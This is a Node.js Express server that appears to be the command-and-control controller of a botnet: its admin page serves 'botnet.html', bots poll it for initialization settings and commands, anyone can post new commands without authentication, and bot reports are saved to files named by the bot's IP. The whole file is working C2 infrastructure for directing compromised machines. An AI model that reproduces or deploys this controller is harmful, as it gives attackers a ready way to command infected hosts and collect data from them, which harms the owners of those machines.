/****************************************************************************** 
* DEPENDENCIES 
******************************************************************************/
var express    = require('express');
var args       = require('command-line-args');
var bodyParser = require('body-parser');
var jsonFile   = require('jsonfile');
var path       = require('path');


/****************************************************************************** 
* APP SETUP 
******************************************************************************/
var app = express();
app.use('/vendors', express.static(path.join(__dirname, 'vendors')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use(bodyParser.json());


/****************************************************************************** 
* OPTIONS 
******************************************************************************/
const options = args([
  { name: 'port', alias: 'p', type: Number },
  { name: 'report', alias: 'r', type: String }
]);

const port = options.port || 3000;

const reportFilePattern = options.report || 'data/report/report.${botIp}.json';


/******************************************************************************
 * DATA
 ******************************************************************************/
var INITIALIZATION = {'auth.user-agent': 'MyAwesomeBot', 'sleep': null};

var COMMAND = {'timestamp': 0, 'command': 'NONE'};


/****************************************************************************** 
* HANDLERS 
******************************************************************************/
function fnLandingPage(req, res) {
  res.sendFile(path.join(__dirname + '/views/landing.html'));
}

function fnAdminPage(req, res) {
  //res.sendFile(path.join(__dirname + '/views/admin.html'));
  res.sendFile(path.join(__dirname + '/views/botnet.html'));
}

function fnGetInitialization(req, res) {
	res.json(INITIALIZATION);
}

function fnSubmitInitialization(req, res) {
  INITIALIZATION = req.body;
  console.log('New initialization submitted: %s', JSON.stringify(INITIALIZATION));
  res.status(200);
}

function fnGetCommand(req, res) {
  res.json(COMMAND);
}

function fnSubmitCommand(req, res) {
  COMMAND = req.body;
  console.log('New command submitted: %s', JSON.stringify(COMMAND));
  res.status(200);
}

function fnReport(req, res) {
	var report = req.body;
  var bip    = req.ip;
  var file   = reportFilePattern.replace(/\$\{botIp\}/, bip);
  console.log('Received report from %s: %s', bip, JSON.stringify(report));
	jsonFile.writeFile(file, report, {spaces: 2});
  console.log('Report saved in %s', file);
	res.send('Report saved')
};


/****************************************************************************** 
* REST API 
******************************************************************************/
app.get('/', fnLandingPage);

app.get('/admin', fnAdminPage);

app.get('/init', fnGetInitialization);

app.post('/init', fnSubmitInitialization);

app.get('/command', fnGetCommand);

app.post('/command', fnSubmitCommand);

app.post('/report', fnReport);


/****************************************************************************** 
* START 
******************************************************************************/
app.listen(port, function () {
  console.log('Controller ready on port %d', port)
});
